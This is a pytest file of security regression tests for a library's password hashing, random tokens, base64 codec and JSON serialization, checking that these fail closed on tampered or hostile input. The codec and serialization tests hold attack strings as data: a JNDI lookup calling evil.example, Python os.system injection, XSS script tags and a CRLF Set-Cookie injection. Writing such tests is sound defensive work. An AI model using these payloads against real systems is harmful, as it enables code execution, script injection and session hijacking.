"""Security regression tests for :mod:`renus.util`.

These tests document the security-relevant behavior of the shared utilities:

- password hashing must use a unique per-hash salt, verify only the exact
  password, and fail closed (return ``False``, never raise) on malformed,
  tampered, or unsupported stored hashes,
- two different passwords must never produce the same digest (NUL-byte
  truncation in ``hashlib.pbkdf2_hmac`` is mitigated by rejecting NULs),
- password verification must not be downgradable to a weaker configuration
  and must compare digests in constant time,
- random strings/tokens must come from the operating system CSPRNG, so
  seeding the non-secure ``random`` module must not predict them,
- ``decode64`` must treat attacker-controlled payloads as pure data (no code
  execution) and fail closed with ``CodecError`` on malformed input,
- JSON serialization must keep attacker-supplied strings as data (no JSON
  structure injection) and the deserialization hook must fail closed on
  hostile payloads instead of returning corrupted objects.
"""

from __future__ import annotations

import base64
import json
import random as _random
import secrets
import string
import uuid

import pytest

from renus.util import (
    CodecError,
    decode64,
    encode64,
    get_random_string,
    get_random_token,
    hash_new_password,
    is_correct_password,
    loads,
)
from renus.util.serialization import dumps


# --------------------------------------------------------------------------
# Password hashing (renus.util.security)
# --------------------------------------------------------------------------


class TestPasswordHashing:
    def test_salt_is_unique_per_hash(self):
        hashes = [hash_new_password("s3cret") for _ in range(20)]
        salts = [h.split("$")[0] for h in hashes]
        assert len(set(salts)) == len(salts), "salt reuse detected"

    def test_salt_and_digest_have_full_entropy(self):
        stored = hash_new_password("s3cret")
        salt, digest = stored.split("$")
        # 16-byte salt -> 22 urlsafe chars, 32-byte digest -> 43 chars.
        assert len(base64.urlsafe_b64decode(salt + "==")) == 16
        assert len(base64.urlsafe_b64decode(digest + "==")) == 32

    def test_only_exact_password_matches(self):
        stored = hash_new_password("s3cret")
        assert is_correct_password(stored, "S3cret") is False
        assert is_correct_password(stored, "s3cret ") is False
        assert is_correct_password(stored, " s3cret") is False
        assert is_correct_password(stored, "s3cret🙂") is False

    def test_nul_appended_password_is_rejected(self):
        # Regression: CPython's OpenSSL-backed pbkdf2_hmac truncates the
        # password at the first NUL byte, so "X\x00<suffix>" used to derive
        # the same digest as "X". NULs are now rejected before hashing.
        stored = hash_new_password("s3cret")
        assert is_correct_password(stored, "s3cret\x00") is False
        assert is_correct_password(stored, "s3cret\x00attacker-controlled") is False

    def test_distinct_nul_passwords_do_not_collapse(self):
        # Registration must fail closed instead of creating an equivalence
        # class; verification of a NUL-bearing password must not match.
        with pytest.raises(ValueError):
            hash_new_password("\x00")
        with pytest.raises(ValueError):
            hash_new_password("abc\x00xyz")
        assert hash_new_password("") != hash_new_password("abc")
        assert is_correct_password(hash_new_password(""), "\x00") is False
        assert is_correct_password(hash_new_password("abc"), "abc\x00xyz") is False

    def test_tampered_hash_is_rejected(self):
        stored = hash_new_password("s3cret")
        salt, digest = stored.split("$")
        flipped_salt = ("A" if salt[0] != "A" else "B") + salt[1:]
        flipped_digest = ("A" if digest[0] != "A" else "B") + digest[1:]
        assert is_correct_password(f"{flipped_salt}${digest}", "s3cret") is False
        assert is_correct_password(f"{salt}${flipped_digest}", "s3cret") is False
        assert is_correct_password(stored[:-2], "s3cret") is False
        assert is_correct_password(stored + "AA", "s3cret") is False

    @pytest.mark.parametrize(
        "stored",
        [
            "",
            "$",
            "a$",
            "$b",
            "a$b$c",
            "abc",
            "=====$=====",
            "???$???",
            "AAAA$AAAA",
            "A" * 100,
            secrets.token_hex(32),
            "pbkdf2_sha256$1$" + "A" * 64,
            "a$b" + "$" + "c",
            "\x00$\x00",
        ],
    )
    def test_malformed_stored_hash_fails_closed(self, stored):
        assert is_correct_password(stored, "s3cret") is False

    def test_non_string_stored_hash_fails_closed(self):
        for bad in (None, 123, b"abc", ["a", "b"], {"a": "b"}):
            assert is_correct_password(bad, "s3cret") is False

    def test_non_string_password_fails_closed(self):
        stored = hash_new_password("s3cret")
        for bad in (None, 123, b"s3cret", ["s3cret"]):
            assert is_correct_password(stored, bad) is False

    def test_hash_new_password_requires_text(self):
        for bad in (None, 123, b"s3cret"):
            with pytest.raises(TypeError):
                hash_new_password(bad)

    def test_no_configuration_downgrade_via_stored_hash(self):
        # The stored format carries no tunable cost factor; a hash shaped like
        # a multi-field format embedding a weak iteration count is rejected.
        assert is_correct_password("c2FsdA$c2FsdA", "s3cret") is False
        assert is_correct_password("1$YQ$YQ", "s3cret") is False

    def test_verification_uses_constant_time_comparison(self, monkeypatch):
        calls = []
        real_compare = secrets.compare_digest

        def spy(a, b):
            calls.append((a, b))
            return real_compare(a, b)

        monkeypatch.setattr(secrets, "compare_digest", spy)
        stored = hash_new_password("s3cret")
        assert is_correct_password(stored, "s3cret") is True
        assert len(calls) == 1
        derived, digest = calls[0]
        assert len(derived) == len(digest) == 32

    def test_long_password_round_trips(self):
        password = "P" + "x" * 4096
        stored = hash_new_password(password)
        assert is_correct_password(stored, password) is True
        assert is_correct_password(stored, "P" + "x" * 4095 + "y") is False

    def test_empty_password_is_hashed_and_distinguishable(self):
        stored = hash_new_password("")
        assert is_correct_password(stored, "") is True
        assert is_correct_password(stored, " ") is False
        # An empty password must not match a hash of a real password.
        other = hash_new_password("real-password")
        assert is_correct_password(other, "") is False


# --------------------------------------------------------------------------
# Random strings and tokens (renus.util.random)
# --------------------------------------------------------------------------


class TestRandomTokens:
    def test_seeding_random_module_does_not_predict_output(self):
        _random.seed(0)
        first = [get_random_token(32) for _ in range(8)]
        _random.seed(0)
        second = [get_random_token(32) for _ in range(8)]
        assert first != second, "output is reproducible via the non-secure RNG"

    def test_tokens_are_url_safe(self):
        allowed = set(string.ascii_letters + string.digits + "-_")
        for token in (get_random_token(64), get_random_string(64)):
            assert set(token) <= allowed
            assert '"' not in token and "'" not in token
            assert "/" not in token and "\\" not in token

    def test_no_collisions_across_many_tokens(self):
        tokens = {get_random_token(32) for _ in range(500)}
        assert len(tokens) == 500

    def test_length_is_honored(self):
        assert len(get_random_token(1)) == 1
        assert len(get_random_token(128)) == 128
        assert len(get_random_string(0)) == 0

    def test_alphabet_is_respected(self):
        value = get_random_string(256, alphabet="01")
        assert set(value) <= {"0", "1"}


# --------------------------------------------------------------------------
# Base64/JSON codec (renus.util.codec)
# --------------------------------------------------------------------------


class TestDecode64UntrustedInput:
    @pytest.mark.parametrize(
        "payload",
        [
            "__import__('os').system('id')",
            "os.system('id')",
            '{"__init__": {"__globals__": "os"}}',
            "[1, 2].constructor",
            "eval('1+1')",
            "exec('import os')",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.example/a}",
        ],
    )
    def test_decode_returns_data_never_executes_code(self, payload):
        decoded = decode64(encode64(payload))
        assert decoded == payload

    @pytest.mark.parametrize(
        "token",
        [
            "",
            "!!!",
            "abc$def",
            "YWJj",
            "YQ",
            "====",
            "a=b=",
            "%2B%2F%3D",
            "\x00\x00",
            " " * 8,
        ],
    )
    def test_garbage_fails_closed_with_codec_error(self, token):
        with pytest.raises(CodecError):
            decode64(token)

    def test_tampered_payload_fails_closed(self):
        token = encode64({"user_id": 7, "role": "admin"})
        corrupt = ("A" if token[0] != "A" else "B") + token[1:]
        with pytest.raises(CodecError):
            decode64(corrupt)

    def test_deeply_nested_payload_fails_closed(self):
        deep = "[" * 50_000 + "]" * 50_000
        token = base64.urlsafe_b64encode(deep.encode()).decode().rstrip("=")
        with pytest.raises(CodecError):
            decode64(token)

    def test_invalid_utf8_payload_fails_closed(self):
        token = base64.urlsafe_b64encode(b"\xff\xfe\xfa").decode().rstrip("=")
        with pytest.raises(CodecError):
            decode64(token)


# --------------------------------------------------------------------------
# JSON serialization (renus.util.serialization)
# --------------------------------------------------------------------------


class TestSerializationUntrustedInput:
    @pytest.mark.parametrize(
        "evil",
        [
            '","injected":true,"x":"',
            "</script><script>alert(1)</script>",
            "line1\r\nSet-Cookie: session=attacker",
            '{"key": "value"}',
            "\\",
            "\x00\x1f\x7f",
        ],
    )
    def test_hostile_strings_stay_data_in_json_output(self, evil):
        document = {"field": evil}
        raw = dumps(document)
        # The output must remain a single valid JSON document whose only
        # value for "field" is the original attacker string.
        assert loads(raw) == document
        reparsed = json.loads(raw)
        assert reparsed["field"] == evil

    def test_hostile_keys_stay_data_in_json_output(self):
        key = '","admin":true,"k":"'
        raw = dumps({key: 1})
        assert json.loads(raw) == {key: 1}

    def test_near_miss_id_prefixes_are_not_transformed(self):
        data = loads('{"a": "identity:123", "b": "ID:123", "c": "xid:9", "d": "id"}')
        assert data["a"] == "identity:123"
        assert data["b"] == "ID:123"
        assert data["c"] == "xid:9"
        assert data["d"] == "id"

    def test_plain_numeric_strings_are_not_typed(self):
        data = loads('{"a": "1234", "b": "000123", "c": "-42"}')
        assert data["a"] == "1234"
        assert data["b"] == "000123"
        assert data["c"] == "-42"

    def test_trusted_id_values_decode_to_id_objects(self):
        from renus.datastructures.id import ID

        data = loads('{"pk": "id:123"}')
        assert isinstance(data["pk"], ID)
        assert data["pk"].value == 123

    def test_malformed_id_value_fails_closed(self):
        # An attacker-supplied "id:" value that cannot be coerced must raise
        # a controlled ValueError, never silently produce a wrong identity.
        with pytest.raises(ValueError):
            loads('{"pk": "id:not-a-number"}')

    def test_deeply_nested_json_fails_closed(self):
        deep = "[" * 100_000 + "]" * 100_000
        with pytest.raises(Exception) as excinfo:
            loads(deep)
        # Must not return attacker-controlled partially-parsed data.
        assert excinfo.value is not None

    def test_garbage_json_fails_closed(self):
        for bad in ("{", "undefined", "{'a': 1}", "1.2.3", ""):
            with pytest.raises(ValueError):
                loads(bad)

    def test_uuid_and_datetime_decode_to_typed_values_only(self):
        value = str(uuid.uuid4())
        data = loads(json.dumps({"uid": value, "name": value + "x"}))
        assert str(data["uid"]) == value
        assert data["name"] == value + "x"  # near miss stays a string
